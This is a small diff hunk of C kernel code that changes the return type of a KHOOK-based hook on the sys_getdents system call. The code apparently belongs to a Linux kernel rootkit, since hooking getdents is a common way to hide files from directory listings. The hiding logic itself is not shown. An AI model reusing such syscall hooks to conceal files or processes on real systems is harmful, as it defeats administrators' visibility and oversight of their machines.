@@ -242,7 +242,7 @@ static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *di
 //　　return value;
 //}
 
-KHOOK_EXT(unsigned int, sys_getdents, struct linux_dirent64 __user *, unsigned int);
+KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
 	int ret = 0;
